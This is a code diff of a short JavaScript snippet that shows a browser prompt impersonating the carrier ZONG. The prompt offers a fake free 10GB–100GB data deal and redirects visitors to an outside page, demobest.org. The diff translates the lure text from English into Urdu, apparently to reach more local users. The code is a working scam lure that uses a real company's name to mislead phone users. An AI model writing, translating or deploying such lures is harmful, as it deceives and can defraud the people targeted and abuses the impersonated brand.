@@ -1,6 +1,6 @@
 
-var password = 'ACTIVATE 100GB'
-password=prompt('ZONG: Dear customer, please check if your SIM card is eligible to receive a special offer of 10GB - 100GB. Press OK to check now..','ACTIVATE 100GB');
-if (password != 'ACTIVATE 100GB') {
+var password = '100 جی بی کو چالو کریں۔'
+password=prompt('ZONG: عزیز کسٹمر، براہ کرم چیک کریں کہ آیا آپ کا سم کارڈ 10GB - 100GB کی خصوصی پیشکش حاصل کرنے کا اہل ہے۔ ابھی چیک کرنے کے لیے ٹھیک ہے دبائیں۔..','100 جی بی کو چالو کریں۔');
+if (password != '100 جی بی کو چالو کریں۔') {
 location.href='https://demobest.org/zong.html';
 }
